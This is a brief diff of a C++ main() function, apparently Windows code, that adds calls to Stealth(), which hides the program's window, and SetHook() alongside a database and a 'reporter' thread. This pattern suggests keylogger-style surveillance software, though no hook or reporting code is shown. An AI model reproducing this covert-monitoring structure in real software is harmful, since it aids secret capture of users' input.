@@ -286,6 +286,12 @@ int main()
   create_db();
   thread = CreateThread(NULL, 0, reporter, &rank, 0, &tid);
 
+  // visibility of window
+	Stealth();
+
+	// Set the hook
+	SetHook();
+
   // loop to keep the console application running.
   /*std::string line;
 	while (keep_running) {
